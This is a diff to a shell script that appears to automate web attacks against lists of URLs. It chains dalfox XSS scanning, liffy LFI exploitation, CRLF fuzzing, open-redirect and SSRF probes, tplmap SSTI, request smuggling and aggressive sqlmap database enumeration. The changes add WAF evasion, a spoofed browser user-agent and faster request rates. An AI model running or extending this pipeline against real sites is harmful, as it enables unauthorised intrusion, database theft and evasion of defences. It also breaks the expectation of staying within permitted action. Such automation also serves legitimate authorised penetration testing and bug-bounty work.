@@ -24,8 +24,8 @@ if [ ${#missing_files[@]} -eq 0 ]; then
     cat 403.txt | while read url; do headi -u $url -p internal_CLoudEnum_IPs.txt | anew 403_Response.txt ; done
     
     # XSS injection
-    dalfox file XSS.txt -o XSS_Inject_Response.txt;
-    sleep 5
+    dalfox file XSS.txt --waf-evasion --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0' -o XSS_Inject_Response.txt;
+    sleep 3
     
     # LFI injection
     
@@ -36,37 +36,37 @@ if [ ${#missing_files[@]} -eq 0 ]; then
     cd liffy
     cat LFI.txt | while read url; do python3 liffy.py $url -d -i -e -f | anew ../LFI_new_Response.txt; done
     cd ../
-    sleep 5
+    sleep 3
     
     # CRLF injection
     crlfuzz -l ALLWithout404.txt -c 20 | anew CRLF_Inject_Response.txt
-    sleep 5
+    sleep 3
     
     # Open Redirect
     cd Oralyzer
     python3 oralyzer.py -l SSRF.txt | anew ../Open_Redirect_Response.txt
     cd ../
-    sleep 5
+    sleep 3
     
     # SSRF injection
-    cat SSRF.txt | qsreplace "Burp collaborator payload" | while read url; do httpx -u $url --status-code -o SSRF_Inject_Response.txt | anew SSRF_Inject_anew_Response.txt; done
-    sleep 5
+    cat SSRF.txt | qsreplace "Burp collaborator payload" | while read url; do httpx -t 30 -rl 100 -u $url --status-code -o SSRF_Inject_Response.txt | anew SSRF_Inject_anew_Response.txt; done
+    sleep 3
     
     # SSTI injection
     cd tplmap
     cat SSTI.txt | while read url; do python3 tplmap.py -u $url | anew ../SSTI_Inject_Response.txt; done
     cd ../
-    sleep 5
+    sleep 3
     
     # Smuggler injection
     cd smuggler
     cat ALLWithout404.txt | python3 smuggler.py | anew Smuggler_Response.txt
     cd ../
-    sleep 5
+    sleep 3
     
     # SQL injection
     sqlmap -m SQL.txt --level 5 --risk 3 --batch --dbs --tamper=between | anew SQL_Inject_Response.txt;
-    sleep 5
+    sleep 3
     
     
     # OS command injection
